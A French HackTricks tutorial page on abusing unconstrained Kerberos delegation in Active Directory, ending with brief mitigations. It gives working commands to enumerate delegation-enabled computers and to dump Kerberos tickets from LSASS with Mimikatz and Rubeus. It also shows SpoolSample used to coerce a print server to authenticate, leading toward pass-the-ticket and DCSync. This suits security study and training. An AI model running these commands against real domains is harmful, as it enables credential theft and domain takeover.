# Délégation non contrainte

{% hint style="success" %}
Apprenez et pratiquez le hacking AWS :<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Apprenez et pratiquez le hacking GCP : <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenir HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop) !
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez-nous sur** **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de hacking en soumettant des PRs aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) dépôts github.

</details>
{% endhint %}

## Délégation non contrainte

C'est une fonctionnalité qu'un administrateur de domaine peut définir pour tout **ordinateur** à l'intérieur du domaine. Ensuite, chaque fois qu'un **utilisateur se connecte** à l'ordinateur, une **copie du TGT** de cet utilisateur va être **envoyée à l'intérieur du TGS** fourni par le DC **et sauvegardée en mémoire dans LSASS**. Donc, si vous avez des privilèges d'administrateur sur la machine, vous pourrez **extraire les tickets et usurper les utilisateurs** sur n'importe quelle machine.

Ainsi, si un administrateur de domaine se connecte à un ordinateur avec la fonctionnalité "Délégation non contrainte" activée, et que vous avez des privilèges d'administrateur local sur cette machine, vous pourrez extraire le ticket et usurper l'administrateur de domaine n'importe où (privesc de domaine).

Vous pouvez **trouver des objets ordinateur avec cet attribut** en vérifiant si l'attribut [userAccountControl](https://msdn.microsoft.com/en-us/library/ms680832\(v=vs.85\).aspx) contient [ADS\_UF\_TRUSTED\_FOR\_DELEGATION](https://msdn.microsoft.com/en-us/library/aa772300\(v=vs.85\).aspx). Vous pouvez le faire avec un filtre LDAP de ‘(userAccountControl:1.2.840.113556.1.4.803:=524288)’, ce que fait powerview :

<pre class="language-bash"><code class="lang-bash"># Lister les ordinateurs non contraints
## Powerview
Get-NetComputer -Unconstrained #Les DC apparaissent toujours mais ne sont pas utiles pour privesc
<strong>## ADSearch
</strong>ADSearch.exe --search "(&#x26;(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname,operatingsystem
<strong># Exporter les tickets avec Mimikatz
</strong>privilege::debug
sekurlsa::tickets /export #Méthode recommandée
kerberos::list /export #Autre méthode

# Surveiller les connexions et exporter de nouveaux tickets
.\Rubeus.exe monitor /targetuser:&#x3C;username> /interval:10 #Vérifier toutes les 10s pour de nouveaux TGTs</code></pre>

Chargez le ticket de l'administrateur (ou de l'utilisateur victime) en mémoire avec **Mimikatz** ou **Rubeus pour un** [**Pass the Ticket**](pass-the-ticket.md)**.**\
Plus d'infos : [https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)\
[**Plus d'informations sur la délégation non contrainte sur ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)

### **Forcer l'authentification**

Si un attaquant est capable de **compromettre un ordinateur autorisé pour "Délégation non contrainte"**, il pourrait **tromper** un **serveur d'impression** pour **se connecter automatiquement** contre lui **en sauvegardant un TGT** dans la mémoire du serveur.\
Ensuite, l'attaquant pourrait effectuer une **attaque Pass the Ticket pour usurper** le compte d'ordinateur du serveur d'impression.

Pour faire en sorte qu'un serveur d'impression se connecte à n'importe quelle machine, vous pouvez utiliser [**SpoolSample**](https://github.com/leechristensen/SpoolSample):
```bash
.\SpoolSample.exe <printmachine> <unconstrinedmachine>
```
Si le TGT provient d'un contrôleur de domaine, vous pourriez effectuer une [**attaque DCSync**](acl-persistence-abuse/#dcsync) et obtenir tous les hachages du DC.\
[**Plus d'infos sur cette attaque sur ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation)

**Voici d'autres façons d'essayer de forcer une authentification :**

{% content-ref url="printers-spooler-service-abuse.md" %}
[printers-spooler-service-abuse.md](printers-spooler-service-abuse.md)
{% endcontent-ref %}

### Atténuation

* Limiter les connexions DA/Admin à des services spécifiques
* Définir "Le compte est sensible et ne peut pas être délégué" pour les comptes privilégiés.

{% hint style="success" %}
Apprenez et pratiquez le hacking AWS :<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Apprenez et pratiquez le hacking GCP : <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenir HackTricks</summary>

* Vérifiez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop) !
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez-nous sur** **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de hacking en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) dépôts github.

</details>
{% endhint %}
